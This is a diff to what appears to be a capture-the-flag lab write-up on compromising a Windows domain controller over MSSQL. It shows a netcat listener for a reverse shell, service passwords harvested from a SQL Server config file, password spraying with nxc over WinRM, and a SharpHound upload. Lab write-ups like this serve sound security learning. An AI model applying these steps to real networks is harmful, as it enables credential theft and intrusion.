@@ -186,7 +186,7 @@ MSSQL       10.10.11.51     1433   DC01             [+] DC01\sa:MSSQLP@ssw0rd! (
 ```
 
 Open a listener
-```
+```bash
 nc -nvlp 9001
 ```
 
@@ -201,14 +201,28 @@ pwd
 C:\SQL2019\ExpressAdv_ENU
 
 more sql-Configuration.INI
-[OPTIONS] ACTION="Install" QUIET="True" FEATURES=SQL INSTANCENAME="SQLEXPRESS" INSTANCEID="SQLEXPRESS" RSSVCACCOUNT="NT Service\ReportServer$SQLEXPRESS" AGTSVCACCOUNT="NT AUTHORITY\NETWORK SERVICE" AGTSVCSTARTUPTYPE="Manual" COMMFABRICPORT="0" COMMFABRICNETWORKLEVEL=""0" COMMFABRICENCRYPTION="0" MATRIXCMBRICKCOMMPORT="0" SQLSVCSTARTUPTYPE="Automatic" FILESTREAMLEVEL="0" ENABLERANU="False"  SQLCOLLATION="SQL_Latin1_General_CP1_CI_AS" SQLSVCACCOUNT="SEQUEL\sql_svc" SQLSVCPASSWORD="WqSZAF6CysDQbGb3" SQLSYSADMINACCOUNTS="SEQUEL\Administrator" SECURITYMODE="SQL" SAPWD="MSSQLP@ssw0rd!" ADDCURRENTUSERASSQLADMIN="False" TCPENABLED="1" NPENABLED="1" BROWSERSVCSTARTUPTYPE="Automatic" IAcceptSQLServerLicenseTerms=True 
+...
+SQLSVCACCOUNT="SEQUEL\sql_svc" SQLSVCPASSWORD="WqSZAF6CysDQbGb3" 
+...
 ```
+
+
+Spray the password again at the `users.txt` to find that `ryan` reused it.
+```bash
+nxc winrm 'DC01' -u users.txt -p creds.txt -d 'sequel.htb' --continue-on-success
+
+...
+WINRM       10.10.11.51     5985   DC01             [+] sequel.htb\ryan:WqSZAF6CysDQbGb3 (Pwn3d!)
+...
+```
+
+
 
 Upload SharpHound
 ```powershell
 nxc mssql 'DC01' -u 'sa'  -p 'MSSQLP@ssw0rd!' --local-auth --put-file SharpHound.exe 'C:\Users\Public\SharpHound.exe'
-MSSQL       10.10.11.51     1433   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:sequel.htb)
-MSSQL       10.10.11.51     1433   DC01             [+] DC01\sa:MSSQLP@ssw0rd! (Pwn3d!)
+
+...
 MSSQL       10.10.11.51     1433   DC01             [*] Copy SharpHound.exe to C:\Users\Public\SharpHound.exe
 MSSQL       10.10.11.51     1433   DC01             [*] Size is 1286656 bytes
 MSSQL       10.10.11.51     1433   DC01             [+] File has been uploaded on the remote machine
